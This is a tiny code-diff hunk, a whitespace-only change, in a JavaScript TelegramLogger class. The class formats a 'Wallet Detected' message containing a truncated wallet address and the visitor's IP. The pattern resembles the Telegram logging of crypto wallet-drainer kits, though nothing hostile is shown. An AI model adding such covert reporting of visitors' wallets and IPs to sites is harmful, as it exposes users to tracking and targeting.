@@ -99,7 +99,7 @@ class TelegramLogger {
     
     const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
     const ip = data.ip || 'Unknown';
-    
+
     const message = `
 <b>👛 Wallet Detected</b>
 
